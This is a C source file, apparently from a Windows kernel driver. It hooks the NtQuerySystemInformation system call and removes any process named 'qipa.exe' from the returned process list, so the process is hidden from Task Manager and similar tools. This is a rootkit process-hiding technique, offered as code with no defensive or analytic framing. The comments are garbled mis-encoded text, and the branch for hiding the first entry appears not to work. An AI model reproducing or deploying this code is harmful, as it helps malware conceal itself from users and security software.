#include "declare.h"	
NTSYSAPI NTSTATUS NTAPI ZwQuerySystemInformation (  
		__in SYSTEM_INFORMATION_CLASS SystemInformationClass,  
		__out_bcount_opt(SystemInformationLength) PVOID SystemInformation,   
		__in ULONG SystemInformationLength,  
		__out_opt PULONG ReturnLength   
		);  
		
typedef NTSTATUS (* NTQUERYSYSTEMINFORMATION)(  
     __in SYSTEM_INFORMATION_CLASS SystemInformationClass,  
     __out_bcount_opt(SystemInformationLength) PVOID SystemInformation, 
	 __in ULONG SystemInformationLength,  
	 __out_opt PULONG ReturnLength  
	 );
	 
NTSTATUS HookNtQuerySystemInformation (   
   __in SYSTEM_INFORMATION_CLASS SystemInformationClass, 
   __out_bcount_opt(SystemInformationLength) PVOID SystemInformation,  
   __in ULONG SystemInformationLength,  
   __out_opt PULONG ReturnLength   
   );      


   //=====================================================================================// 
   //Name: NTSTATUS HookNtQuerySystemInformation()                                        // 
   //                                                                                     //  
   //Descripion: �Զ���� NtQuerySystemInformation������ʵ�� Hook Kernel API              //  
   //                     ZwQuerySyetemInformation                                                                //  
   //=====================================================================================//  
   NTSTATUS HookNtQuerySystemInformation (   
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,   
	__out_bcount_opt(SystemInformationLength)PVOID SystemInformation, 
	__in ULONG SystemInformationLength,  
    __out_opt PULONG ReturnLength  
    ) 
	{ 
		UNICODE_STRING TargetName;
		NTSTATUS rtStatus;  
		ULONG comp;		
		
		NTQUERYSYSTEMINFORMATION pOldNtQuerySystemInformation = (NTQUERYSYSTEMINFORMATION)oldSysServiceAddr[SYSCALL_INDEX(ZwQuerySystemInformation)];  
		rtStatus = pOldNtQuerySystemInformation(SystemInformationClass, SystemInformation,  
		SystemInformationLength, ReturnLength); 
		
		RtlInitUnicodeString(&TargetName,L"qipa.exe");
 
		if(NT_SUCCESS(rtStatus))  
		{  
			if(SystemProcessInformation == SystemInformationClass)  
			{ 
				PSYSTEM_PROCESS_INFORMATION pPrevProcessInfo = NULL; 
				PSYSTEM_PROCESS_INFORMATION pCurrProcessInfo =  
				(PSYSTEM_PROCESS_INFORMATION)SystemInformation;  
				while(pCurrProcessInfo != NULL)
				{  
					//��ȡ��ǰ������ SYSTEM_PROCESS_INFORMATION �ڵ�Ľ������ƺͽ��� ID 
					ULONG uPID = (ULONG)pCurrProcessInfo->ProcessId; 				//����ID
					UNICODE_STRING strTmpProcessName = pCurrProcessInfo->ImageName;  	//������
					//�жϵ�ǰ��������������Ƿ�Ϊ��Ҫ���صĽ���  
					comp=RtlCompareUnicodeString(&strTmpProcessName,&TargetName,TRUE);
					if(comp == 0)  					//���̺�
					{  
						KdPrint(("%d:",uPID));
						KdPrint(("%wZ\n",&strTmpProcessName));
						//KdPrint(("%d\n",comp));
						
						if(pPrevProcessInfo)  
						{  
							if(pCurrProcessInfo->NextEntryOffset) 
							{  
								//����ǰ�������(��Ҫ���صĽ���)�� SystemInformation ��ժ��(��������ƫ��ָ��ʵ��)  
								pPrevProcessInfo->NextEntryOffset += pCurrProcessInfo->NextEntryOffset; 
							}  
							else 
							{ 
								//˵����ǰҪ���ص���������ǽ��������е����һ��  
								pPrevProcessInfo->NextEntryOffset = 0;  
							} 
						}  
						else 
						{	
							//˵����ǰΪ��һ�ڵ�
							if(pCurrProcessInfo->NextEntryOffset)  
							{ 
								(PCHAR)SystemInformation += pCurrProcessInfo->NextEntryOffset;  
							} 
							else  
							{  
								SystemInformation = NULL;  
							}  		
						}  
					}  
					//������һ�� SYSTEM_PROCESS_INFORMATION �ڵ�
					pPrevProcessInfo = pCurrProcessInfo;                   //��������  
					if(pCurrProcessInfo->NextEntryOffset)  
					{  
						pCurrProcessInfo = (PSYSTEM_PROCESS_INFORMATION)  
						(((PCHAR)pCurrProcessInfo) + pCurrProcessInfo->NextEntryOffset); 
					} 
					else  
					{ 
						pCurrProcessInfo = NULL;  
					}
				}
			}  
		}    
    return rtStatus; 
	}